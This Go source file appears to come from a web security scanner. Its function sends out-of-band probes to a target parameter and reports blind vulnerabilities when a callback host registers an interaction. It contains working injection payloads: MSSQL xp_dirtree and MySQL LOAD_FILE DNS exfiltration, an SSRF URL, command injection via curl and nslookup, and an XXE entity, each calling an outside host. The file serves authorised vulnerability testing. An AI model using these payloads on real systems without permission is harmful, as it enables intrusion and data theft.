package scanner

import (
	"context"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/swiss-knife-for-web-security/skws/internal/core"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/oob"
	"github.com/swiss-knife-for-web-security/skws/internal/http"
)

// testOOBWithClient tests a parameter using out-of-band techniques with the provided client.
func (s *InternalScanner) testOOBWithClient(ctx context.Context, targetURL string, param core.Parameter, method string, client *http.Client) []*core.Finding {
	if s.oobClient == nil {
		return nil
	}

	var findings []*core.Finding

	// Generate OOB payloads for different vulnerability types
	oobPayloads := []struct {
		payloadType string
		builder     func(url string) string
	}{
		{
			payloadType: oob.PayloadTypeSQLi,
			builder: func(url string) string {
				// Multiple SQLi OOB techniques
				return fmt.Sprintf("'; EXEC master..xp_dirtree '\\\\%s\\x'; --", url)
			},
		},
		{
			payloadType: oob.PayloadTypeSQLi,
			builder: func(url string) string {
				// MySQL DNS exfil
				return fmt.Sprintf("' AND LOAD_FILE(CONCAT('\\\\\\\\', (SELECT version()), '.%s\\\\a'))-- ", url)
			},
		},
		{
			payloadType: oob.PayloadTypeSSRF,
			builder: func(url string) string {
				return "http://" + url
			},
		},
		{
			payloadType: oob.PayloadTypeRCE,
			builder: func(url string) string {
				return fmt.Sprintf("; curl http://%s", url)
			},
		},
		{
			payloadType: oob.PayloadTypeRCE,
			builder: func(url string) string {
				return fmt.Sprintf("| nslookup %s", url)
			},
		},
		{
			payloadType: oob.PayloadTypeXXE,
			builder: func(url string) string {
				return fmt.Sprintf(`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://%s">]><foo>&xxe;</foo>`, url)
			},
		},
	}

	paramName := param.Name

	for _, p := range oobPayloads {
		select {
		case <-ctx.Done():
			return findings
		default:
		}

		payload := s.oobClient.GeneratePayload(p.payloadType)
		testPayload := p.builder(payload.DNSPayload())

		// Send payload — errors are expected for malformed payloads, continue to poll for interactions
		if _, err := client.SendPayload(ctx, targetURL, paramName, testPayload, method); err != nil && s.config.Verbose {
			fmt.Fprintf(os.Stderr, "[!] OOB payload send failed for %s: %v\n", p.payloadType, err)
		}
	}

	// Poll for interactions with a reasonable timeout
	pollCtx, cancel := context.WithTimeout(ctx, s.config.OOBPollTimeout)
	defer cancel()

	interactions := s.oobClient.PollWithTimeout(pollCtx, 5*time.Second)

	for _, interaction := range interactions {
		finding := core.NewFinding(
			fmt.Sprintf("Blind %s via OOB", strings.ToUpper(interaction.PayloadType)),
			core.SeverityCritical,
		)
		finding.URL = targetURL
		finding.Parameter = paramName
		finding.Description = fmt.Sprintf("Out-of-band interaction detected (%s) from %s",
			interaction.Protocol, interaction.RemoteAddr)
		finding.Evidence = interaction.String()
		finding.Tool = "internal-oob"

		// Add OWASP mappings based on payload type
		switch interaction.PayloadType {
		case oob.PayloadTypeSQLi:
			finding.WithOWASPMapping([]string{"WSTG-INPV-05"}, []string{"A03:2025"}, []string{"CWE-89"})
		case oob.PayloadTypeSSRF:
			finding.WithOWASPMapping([]string{"WSTG-INPV-19"}, []string{"A10:2025"}, []string{"CWE-918"})
		case oob.PayloadTypeRCE:
			finding.WithOWASPMapping([]string{"WSTG-INPV-12"}, []string{"A03:2025"}, []string{"CWE-78"})
		case oob.PayloadTypeXXE:
			finding.WithOWASPMapping([]string{"WSTG-INPV-07"}, []string{"A05:2025"}, []string{"CWE-611"})
		}

		findings = append(findings, finding)
	}

	return findings
}
